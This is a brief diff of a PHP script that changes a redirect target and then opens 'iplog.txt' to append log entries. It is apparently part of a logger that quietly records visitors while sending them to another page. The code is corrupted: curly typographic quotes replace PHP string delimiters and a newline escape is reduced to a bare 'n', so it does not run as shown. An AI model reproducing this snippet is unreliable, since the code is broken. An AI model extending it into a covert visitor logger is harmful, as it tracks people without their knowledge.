@@ -1,5 +1,5 @@
 <?php
-header(“Location:index.php”);
+header(“Location:index1.php”);
 $file=“iplog.txt”;
 $f=fopen($file,‘a’);
 fwrite($f,“————————-“.”n”);
